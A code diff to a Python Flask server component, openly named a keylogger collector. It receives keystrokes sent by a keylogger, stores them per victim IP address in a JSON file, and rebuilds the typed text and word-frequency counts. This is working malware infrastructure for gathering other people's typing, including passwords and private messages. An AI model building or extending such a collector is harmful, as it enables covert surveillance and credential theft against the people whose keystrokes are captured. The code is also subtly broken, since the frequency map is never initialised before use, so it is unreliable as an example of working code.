@@ -1,23 +1,24 @@
 
 from flask import Blueprint, request
 import json
-from typing import List
+from typing import List, Dict, Final
 import string
 import os
+import re
 keylog: Blueprint = Blueprint('keylog', __name__, None)
 
 data_file: str = "data/keylog.json"
 
 
 @keylog.route('/keylogger/send_data', methods=['POST'])
-def record() -> dict:
+def record() -> Dict[str, int]:
     """
     A POST route to allow a key logger to send its data to the server.
 
     Return:
     A dict, with a key for the response. 0 if successful.
     """
-    data: dict = json.loads(request.json)
+    data: Dict[str, List[str]] = json.loads(request.json)
 
     ip: str = request.remote_addr
     letters: List[str] = data['keys_pressed']
@@ -35,7 +36,7 @@ def record() -> dict:
 
     previous_string += process_key_string(letters)
     data[ip]["string"] = previous_string
-    data[ip]["frequency_map"] = {}
+    data[ip]["frequency_map"] = generate_frequency_map(previous_string)
 
     with open(data_file, "w+") as fp:
         json.dump(data, fp)
@@ -43,7 +44,7 @@ def record() -> dict:
     return {"response": 0}
 
 
-def process_key_string(ip: str) -> str:
+def process_key_string(keys: List[str]) -> str:
     """
     Return a string of an attempt to convert a string of keyboard input to the words typed.
 
@@ -53,11 +54,6 @@ def process_key_string(ip: str) -> str:
     Return:
         the string version of the keyboard input
     """
-    data: dict = None
-    with open(data_file, 'r') as fp:
-        data = json.load(fp)
-
-    keys: List[str] = data[ip]
     result: str = ''
 
     for key in keys:
@@ -86,10 +82,39 @@ def tokenize(data: str, seperators: List[str]) -> List[str]:
         data: the string to be tokenized
         seperators: a list of the seperators to seperate tokens on.
 
-    Return: 
+    Return:
         A list of tokens representing words.
     """
-    pass
+    current_token: str = ''
+    tokens: list[str] = []
+    for char in data:
+        if current_token == '' or (char in seperators) == (current_token[0] in seperators):
+            current_token += char
+        else:
+            tokens.append(current_token)
+            current_token = char
+    tokens.append(current_token)
+    return tokens
 
 
-print(process_key_string('127.0.0.1'))
+def generate_frequency_map(data: str) -> Dict[str, int]:
+    """
+    Given a string, generate a map of each token to the number of occurrences in the string.
+
+    Arguments:
+        data: the string to be converted into a frequency map
+
+    Return:
+        the frequency map of the given string.
+    """
+    seperators: Final[List[str]] = [',', '.', '\n', ' ',
+                                    '\t', '?', '<', '>', '!', ':', ';']
+    tokens: List[str] = tokenize(data, seperators)
+
+    frequency_map: Dict[str, int]
+    for token in tokens:
+        if token in frequency_map.keys():
+            frequency_map[token] += 1
+        else:
+            frequency_map[token] = 1
+    return frequency_map
